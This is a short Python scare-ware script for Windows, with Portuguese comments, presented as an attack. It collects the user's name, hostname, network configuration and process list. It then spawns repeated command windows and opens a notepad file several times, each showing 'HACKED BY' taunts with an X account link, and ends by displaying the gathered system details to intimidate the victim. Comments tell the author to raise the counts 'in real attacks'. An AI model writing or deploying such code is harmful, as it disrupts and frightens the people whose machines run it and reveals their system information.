import subprocess
import time
import os



def fake_file():

    # Pegar algumas informações
    whoami = subprocess.check_output("whoami", shell=True, text=True).strip()
    hostname = subprocess.check_output("hostname", shell=True, text=True).strip()
    ipconfig = subprocess.check_output("ipconfig", shell=True, text=True).strip()
    tasklist = subprocess.check_output("tasklist", shell=True, text=True).strip()
    inf = f"{whoami}\n\n{hostname}\n\n{ipconfig}\n\n{tasklist}"


    # Criar e mostrar o 1 aviso de hacking (cmd)
    for x in range(5): # MUDAR PARA MAIS EM ATAQUES REAIS
        os.system(f'start cmd /k "echo OTARIO HACKED BY TEVO O SHOW https://x.com/estte7end https://x.com/estte7end https://x.com/estte7end"')
        time.sleep(1)
    #os.system("taskkill /f /im cmd.exe") # Deixar em comentário depois (usado apenas para testar e deixar mais facil)
    time.sleep(2)

    # Criar e mostrar o 2 aviso de hacking (notas)
    with open("HACKEDBY.txt", "a", encoding="utf-8") as f:
        for x in range (10):
            f.write("OTARIO HACKED BY TEVO O SHOW\nhttps://x.com/estte7end\n")
    for x in range(5): #MUDAR PARA MAIS NÚMEROS EM ATAQUE REAL
        os.startfile("HACKEDBY.txt")
        time.sleep(1)
        os.system("taskkill /f /im notepad.exe")
    time.sleep(2)


    # Terminar o ataque mostrando as informações 
    with open("info.txt", "a", encoding="utf-8") as f:
        f.write(f"SUAS INFORMAÇÕES ABAIXO OTÁRIO:\n\n\n\n\n\n\n {inf}")
        os.startfile("info.txt")






if __name__ == "__main__":
    os.system("date /t & time /t")
    fake_file()
